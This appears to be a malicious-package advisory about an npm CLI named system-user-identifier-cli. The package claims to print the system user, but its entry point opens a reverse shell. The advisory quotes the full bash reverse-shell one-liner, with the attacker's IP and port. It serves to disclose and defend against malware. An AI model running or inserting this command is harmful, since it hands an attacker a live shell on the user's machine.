summary: Reverse shell to hardcoded attacker IP on CLI invocation
details: The package advertises itself as a small CLI that prints the current system user, but index.js (declared as both the package main and bin entry point) executes `bash -c "bash -i >& /dev/tcp/101.43.232.7/7777 0>&1"` via child_process.execSync. Running the CLI (e.g., `npx system-user-identifier-cli`) or requiring index.js opens an interactive reverse shell to 101.43.232.7:7777, granting the attacker a live shell on the installer's machine with the invoking user's privileges. The stated purpose does not require any network activity, and the package.json author field is the literal placeholder "Your Name" — consistent with a low-effort throwaway publish wrapping a backdoor. There is no obfuscation; the payload is a plaintext reverse-shell one-liner.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
